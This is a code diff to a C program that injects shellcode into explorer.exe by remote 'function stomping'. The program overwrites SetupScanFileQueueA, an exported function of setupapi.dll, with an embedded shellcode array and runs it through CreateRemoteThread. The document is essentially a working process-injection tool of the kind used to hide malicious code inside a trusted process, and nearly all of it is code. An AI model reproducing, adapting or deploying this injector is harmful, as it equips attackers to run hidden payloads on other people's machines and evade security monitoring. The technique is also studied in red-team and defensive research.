@@ -1,10 +1,9 @@
-#include "stomp.h"
+#include "Stomp.h"
 
+#define		SACRIFICIAL_DLL            "setupapi.dll"
+#define		SACRIFICIAL_FUNC           "SetupScanFileQueueA"
+#define		TARGET_PROCESS				L"explorer.exe"
 
-#define SACRIFICIAL_DLL "setupapi.dll"
-#define SACRIFICIAL_FUNC "SetupScanFileQueueA"
-
-// https://github.com/AbdouRoumi/Local-And-Remote_Function_Stomping
 
 UCHAR Shellcode[] = {
 0xfc,0x48,0x83,0xe4,0xf0,
@@ -34,11 +33,22 @@ UCHAR Shellcode[] = {
 0x63,0x2e,0x65,0x78,0x65,0x00
 };
 
-int main()
-{
+int main() {
 
-	PVOID pAddress = NULL;
-	HMODULE hModule;
+	HANDLE		hProcess = NULL, hThread = NULL;
+	PVOID		pAddress = NULL;
+
+	HMODULE		hModule = NULL;
+	DWORD		PID = NULL;
+
+	if (!GetRemoteProcID(TARGET_PROCESS, &PID, &hProcess)) {
+		PRINT_ERROR("GetRemoteProcID");
+		return 1;
+	}
+
+	INFO("[%ld] PID \n", PID);
+
+
 
 	hModule = LoadLibraryA(SACRIFICIAL_DLL);
 	if (hModule == NULL) {
@@ -52,19 +62,28 @@ int main()
 		return 1;
 	}
 
-	size_t sizeofshell = sizeof(Shellcode);
-
-	if (!Local_Stomp(Shellcode, sizeofshell, pAddress))
-	{
-		PRINT_ERROR("LocalStomp");
+	if (!WritePayload(hProcess, pAddress, Shellcode, sizeof(Shellcode))) {
 		return 1;
 	}
 
-	INFO("Current Shellcode Address: [0x%p]", Shellcode);
+	hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
+	if (hThread == NULL)
+	{
+		PRINT_ERROR("CreateRemoteThread");
+		return 1;
+	}
+
+	INFO("Waiting...");
+	WaitForSingleObject(hThread, INFINITE);
 
 	CHAR("Quit...");
 	getchar();
 
-	return 0;
+	if (hProcess)
+		CloseHandle(hProcess);
 
+	if (hThread)
+		CloseHandle(hThread);
+
+	return 0;
 }
